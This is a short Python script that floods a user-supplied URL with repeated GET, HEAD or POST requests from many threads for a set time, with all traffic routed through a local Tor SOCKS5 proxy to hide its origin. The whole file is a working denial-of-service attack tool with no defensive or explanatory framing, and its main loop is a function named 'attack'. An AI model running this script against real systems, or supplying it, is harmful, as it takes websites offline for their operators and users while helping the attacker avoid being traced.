import time
import socks
import socket
import requests
import threading

url = input("URL: ")
method = input("Method(GHP): ").lower()
threads = int(input("Threads: "))
timer = float(input("Time(S): "))

socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
socket.socket = socks.socksocket

timeout = time.time() + 1 * timer

def attack():
	while time.time() < timeout:
		if method == "get" or method == "g":
			requests.get(url)

		if method == "head" or method == "h":
			requests.head(url)

		if method == "post" or method == "p":
			requests.post(url)

for i in range(threads):
	thread = threading.Thread(target=attack)
	thread.setDaemon(True)
	thread.start()

while time.time() < timeout:
	time.sleep(1)